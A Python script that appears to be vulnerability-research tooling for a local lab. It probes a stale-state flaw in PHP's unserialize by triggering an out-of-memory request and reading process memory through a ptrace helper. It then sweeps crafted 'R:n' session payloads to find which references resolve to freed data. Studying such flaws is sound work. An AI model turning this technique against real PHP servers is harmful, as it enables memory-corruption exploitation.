#!/usr/bin/env python3
"""smb_619_state.py — direct stale-state probe on :8151 (assisted /proc).

One instrumented trial:
  restart php (clear state) -> read RW image segment (before)
  -> 12-marker OOM producer fire (server survives per Q1)
  -> read RW segment (after) -> DIFF: find qwords that became heap
     pointers = BG(unserialize).data (and friends). Report addresses.
  -> read the VALUE (d) chunk: dump first 512 bytes of d's page to see
     the stale var_entries (used_slots, marker zval pointers).
  -> consumer walk token R:14 -> session file check.
Then a slot sweep R:1..R:24 (fresh restart + producer each trial).
"""
import base64
import re
import subprocess
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q


def helper(kind, script, timeout=30, which="pid"):
    """`which` = memread mode: 'pid' (main :8080) or 'pid81' (debug :8081)."""
    """Run script in a SYS_PTRACE helper sharing the target pid-ns. The
    helper = the target's own php image (native arm64; the box's debian
    images are x86_64-QEMU, and busybox dd returns zeros on /proc/mem).
    script runs via the memread.php modes: 'pid', 'maps', 'read HEX LEN'."""
    args = script.split()
    if which != "pid":
        args = args + [which]
    r = subprocess.run(["timeout", "27", "docker", "run", "--rm", "--cap-add",
                        "SYS_PTRACE", "--pid=container:" + q.CT[kind],
                        "-v", "/home/user/php-firing-range/scripts:/sc:ro",
                        f"stealmybitcoin-smb-php-{kind}:latest",
                        "php", "/sc/memread.php"] + args,
                      capture_output=True, text=True, timeout=timeout)
    return r.stdout, r.stderr


def get_maps(kind, which="pid"):
    out, err = helper(kind, "maps", which=which)
    return [l for l in out.splitlines() if l.strip()]


def rw_image_region(maps):
    """php binary RW mapping (rw-p on /usr/local/bin/php)."""
    for l in maps:
        if "/usr/local/bin/php" in l and "rw-p" in l:
            a, b = l.split()[0].split("-")
            return int(a, 16), int(b, 16)
    return None


def read_mem(kind, addr, size, which="pid"):
    out, err = helper(kind, f"read {addr:x} {size}", which=which)
    try:
        return base64.b64decode(out.strip())
    except Exception:
        return b""


def heap_ranges(maps):
    rs = []
    for l in maps:
        perms = l.split()[1]
        if "rw" in perms and "/usr/local/bin/php" not in l and "[heap]" not in l:
            a, b = l.split()[0].split("-")
            rs.append((int(a, 16), int(b, 16), l.split()[-1]))
        elif "[heap]" in l:
            a, b = l.split()[0].split("-")
            rs.append((int(a, 16), int(b, 16), "[heap]"))
    return rs


def looks_heap(v, hrs):
    return any(a <= v < b for a, b, _ in hrs)


def snap_rw(kind):
    maps = get_maps(kind)
    reg = rw_image_region(maps)
    hrs = heap_ranges(maps)
    data = read_mem(kind, reg[0], reg[1] - reg[0])
    return reg, data, hrs


def stage_consumer_r(kind, sid, ridx):
    tok = b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:%d;}' % ridx
    t64 = subprocess.run(["base64", "-w0"], input=tok,
                         capture_output=True).stdout.decode()
    q.docker_exec(q.CT[kind],
                  f"F=/tmp/sess_{sid}; rm -f $F; echo {t64} | base64 -d > $F; "
                  f"chown nobody:nobody $F; chmod 600 $F")


def walk_check(kind, sid):
    """TRUE hit = the R:n RESOLVED and was re-encoded on writeback
    (`i:1;s:9:"WALKOK1!"` — the staged form is `i:1;R:n;`). A 502/undecoded
    request leaves the staged token untouched = NOT a hit."""
    rc, out = q.docker_exec(q.CT[kind], f"cat /tmp/sess_{sid} 2>/dev/null")
    return out, 'i:1;s:9:"WALKOK1!"' in out


def instrumented_trial():
    print("=== instrumented trial: restart -> producer -> assisted diff -> walk ===")
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S' || true")
    t, _ = q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    reg, before, hrs = snap_rw("vuln")
    print(f"php rw image region: 0x{reg[0]:x}-0x{reg[1]:x} "
          f"({(reg[1]-reg[0])//1024}KB); heap ranges: "
          f"{[(hex(a), hex(b), n) for a, b, n in hrs]}")
    sid = f"t619{int(time.time())}"
    ok, sz = q.stage_producer("vuln", sid)
    st, dt = q.mp_min(q.VULN, sid)
    print(f"producer: {st} ({dt:.2f}s) staged={sz}")
    reg2, after, hrs2 = snap_rw("vuln")
    print(f"rw bytes read: before={len(before)} after={len(after)}")
    n = min(len(before), len(after))
    changed = []
    for off in range(0, n - 7, 8):
        v0 = int.from_bytes(before[off:off+8], "little")
        v1 = int.from_bytes(after[off:off+8], "little")
        if v0 != v1:
            changed.append((reg[0] + off, v0, v1))
    print(f"changed qwords: {len(changed)}")
    for addr, v0, v1 in changed[:40]:
        tag = ""
        if looks_heap(v1, hrs2):
            tag = "  <-- became HEAP PTR"
        if looks_heap(v0, hrs2):
            tag += " (was heap ptr)"
        print(f"  0x{addr:x}: 0x{v0:x} -> 0x{v1:x}{tag}")
    # follow the first heap-pointer change (candidate BG(unserialize).data)
    cands = [c for c in changed if looks_heap(c[2], hrs2) and c[1] == 0]
    d = None
    if cands:
        addr, v0, d = cands[0]
        print(f"candidate BG(unserialize).data @ 0x{addr:x} -> d = 0x{d:x}")
        dbytes = read_mem("vuln", d, 512)
        print(f"d[0:512] = {dbytes[:64].hex()}")
        for i in range(0, 128, 8):
            print(f"  d+{i:3d}: 0x{int.from_bytes(dbytes[i:i+8], 'little'):016x}")
    # walk consumer
    wsid = f"t619w{int(time.time())}"
    stage_consumer_r("vuln", wsid, 14)
    st, dt = q.mp_min(q.VULN, wsid)
    out = walk_check("vuln", wsid)
    print(f"walk R:14: resp={st} sess={out[:120]!r} RESOLVED={'WALKOK1!' in out}")
    return d


def sweep():
    print("\n=== sweep R:1..R:24 (fresh restart + producer per trial) ===")
    hits = []
    for ridx in range(1, 25):
        q.docker_exec(q.CT["vuln"], "pkill -f 'php -S' || true")
        q.healthy(q.VULN, deadline=15)
        time.sleep(0.4)
        sid = f"sw{ridx}{int(time.time())}"
        q.stage_producer("vuln", sid)
        st, _ = q.mp_min(q.VULN, sid)
        wsid = f"sww{ridx}{int(time.time())}"
        stage_consumer_r("vuln", wsid, ridx)
        st2, _ = q.mp_min(q.VULN, wsid)
        out = walk_check("vuln", wsid)
        hit = "WALKOK1!" in out
        if hit:
            hits.append(ridx)
        print(f"R:{ridx:2d}: prod={st.split(' ')[1] if ' ' in st else st} "
              f"cons={st2.split(' ')[1] if ' ' in st2 else st2} "
              f"sess={out[:40]!r} hit={hit}")
    print(f"HITS: {hits}")


if __name__ == "__main__":
    instrumented_trial()
    sweep()
